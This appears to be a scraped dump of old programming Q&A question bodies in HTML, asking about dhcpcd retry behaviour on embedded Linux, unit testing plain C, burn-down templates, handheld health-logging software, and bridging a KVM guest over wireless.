       "766  <p>I work with embedded Linux systems that sometimes want to get their IP address from a DHCP server.  The DHCP Client client we use (<a href=\"http://www.phystech.com/download/dhcpcd.html\" rel=\"nofollow\" title=\"DHCPCD\">dhcpcd</a>) has limited retry logic.  If our device starts up without any DHCP server available and times out, dhcpcd will exit and the device will never get an IP address until it's rebooted with a DHCP server visible/connected.  I can't be the only one that has this problem.  The problem doesn't even seem to be specific to embedded systems (though it's worse there).  How do you handle this?  Is there a more robust client available?  </p>\\n

       "801  <p>I worked on an embedded system this summer written in straight C.  It was an existing project that the company I work for had taken over.  I have become quite accustomed to writing unit tests in Java using JUnit but was at a loss as to the best way to write unit tests for existing code (which needed refactoring) as well as new code added to the system.</p>\\n\\n<p>Are there any projects out there that make unit testing plain C code as easy as unit testing Java code with JUnit?  Any insight that would apply specifically to embedded development (cross-compiling to arm-linux platform) would be greatly appreciated.</p>\\n

       "828  <p>I'd like to experiment with burn-down and planning game with the team I'm on.  People on my team are interested in making it happen, however I'm sure someone has done this before and has learned some lessons we hopefully don't have to repeat.  Does anyone know of an example Excel (or other tool) template available for burn-down or planning game activities?</p>\\n

       "837  <p>A friend is having mysterious health problems that we're trying to track down.  One thing that would help would be to improve his record keeping by giving him a handheld device with which he could keep track of various details of his day including diet and environmental factors.</p>\\n\\n<p>We will be getting him a device but haven't decided on Palm vs. Windows Mobile vs. other.  I'd like to find some existing software but so far haven't been able to find something that is general enough or customizable to fit our needs.  Ideally I'd like to find an open source project that I can join and contribute while customizing the software to do what I need it to, which I haven't even totally defined yet.</p>\\n\\n<p>I'm a C++ developer (way too) familiar with MSVS6 but would be happy to have an excuse to get into .NET or other modern frameworks.  But if the easiest and quickest option is to work with something in C for the Palm I'd be happy to do that as well.  (I've found a good but somewhat dated reference for <a href=\"http://answers.google.com/answers/threadview/id/123584.html\" rel=\"nofollow\">C++ programming for the Palm</a>)  Similar and more recent info like this is what I'm looking for.</p>\\n\\n<p>Thanks for any advice or suggestions about how to get started with this.  </p>\\n

those answers, too) -- but I'm really hoping there's something in CSS/HTML directly that works across all browsers.</p>\\n

       "945  <p>I'm using KVM to run a Windows virtual machine on my Linux box. Networking is accomplished through a tap device, hooked into a bridged Ethernet device, which allows the Windows VM to basically appear like a separate physical computer on my network. This is pretty nice.</p>\\n\\n<p>However, my understanding is that most, if not all, wireless drivers can't support bridging. I'd really like to be able to roam a little more freely while I'm working -- does anyone know of an effective workaround?</p>\\n\\n<p>User-mode networking won't work, as I have to use some Windows VPN software that wants lower-level networking access.</p>\\n
